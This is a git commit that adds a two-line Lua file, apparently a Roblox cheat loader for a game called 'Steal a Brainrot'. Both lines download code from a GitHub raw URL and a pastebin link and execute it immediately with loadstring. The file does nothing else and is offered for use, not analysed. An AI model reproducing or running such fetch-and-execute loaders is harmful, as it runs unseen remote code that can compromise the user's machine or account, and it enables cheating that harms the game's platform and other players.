33e9c78be86d40a01973e2bc505659330cb0de60
ScriptsVortex <empinada731@gmail.com>
2025-07-26 18:26:05 -0300

    Add files via upload

---
+++ Stealbainrot.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gregy677/Gunmods-strucid/main/Steal%20a%20brain%20rot", true))()
+loadstring(game:HttpGet("https://pastebin.com/raw/91yrQxGJ", true))()
